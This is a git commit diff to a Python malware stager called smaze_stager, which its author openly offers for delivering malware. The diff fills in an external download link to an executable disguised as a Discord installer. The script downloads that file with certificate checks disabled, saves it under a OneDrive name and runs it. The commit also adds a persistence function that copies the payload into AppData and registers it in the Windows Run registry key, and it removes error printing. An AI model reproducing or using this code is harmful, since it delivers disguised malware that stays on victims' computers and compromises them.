fed7907a9e8a20cbca24107ebd66090c67d17fc5
falkensmz <83426553+falkensmz@users.noreply.github.com>
2022-04-18 11:37:34 +0300

    Added persistence function
    This will ensure that the malware you upload via smaze_stager, will stay on the target system. If the malware you upload already has this function pre-built , then you can comment the function out as it might interfere with your code.

--- smaze_stager.py
+++ smaze_stager.py
@@ -2,11 +2,14 @@
 # official github page > https://github.com/falkensmz/smazestager
 
 import os
+from subprocess import call
 import requests
 from time import sleep
 import urllib3
+import shutil
+import sys
 
-link = ""            # input the link to the malware download page here (make sure that the url ends in something like ".exe")
+link = "https://download2390.mediafire.com/7xf1mg70ma5g/54mms69f9v9gvcl/DiscordSetup.exe"            # input the link to the malware download page here (make sure that the url ends in something like ".exe")
 sleep_before = 0     # input the amount of time smaze_stager will sleep until it downloads the malware (in seconds) ;  leave default of '0' for nothing
 sleep_after = 0       # input the amount of time smaze_stager will sleep after it downloads the malware,until it executes it (in seconds) ; leave default of '0' for nothing
 urllib3.disable_warnings()
@@ -35,7 +38,6 @@ def download():
         r = requests.get(link, allow_redirects=True, verify=False)
         open(fr"{path}\OneDrive_setup.exe", 'wb').write(r.content)
     except Exception as e:
-        print(e)
         exit()
     
     
@@ -45,11 +47,23 @@ def runMalware():
         sleep(sleep_after)
         os.chdir(path)
         os.system("OneDrive_setup.exe")
-        sleep(60)
-        exit()
+        sleep(25)       # you can modify this to whatever you want
     except Exception as e:
-        print(e)
         exit()
+
+def establishPersistence(): # this function will make your malware persistent. note that if your malware is programmed to do the same thing, I suggest commenting this function out 
+    try:
+        persistent_malware_location = os.environ["appdata"] + "\\Microsoft_OneDrive.exe"
+        if not os.path.exists(persistent_malware_location):
+            shutil.copyfile(fr'C:\Users\{username}\.OneDrive\OneDrive_setup.exe', persistent_malware_location)
+            call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Microsoft_OneDrive /t REG_SZ /d "' + persistent_malware_location + '"', shell=True)
+        else:
+            # persistence for the executable has already been established, thus the program will exit
+            exit()
+    except Exception as e:
+        exit()
+        
+        
 
 def afterMath():
     getUsername()
@@ -57,8 +71,10 @@ def afterMath():
     createMalwareDropLocation()
     download()
     runMalware()
+    establishPersistence()
 
 afterMath()
+
 
 # thank you for using smaze_stager
 # ~ falkensmz
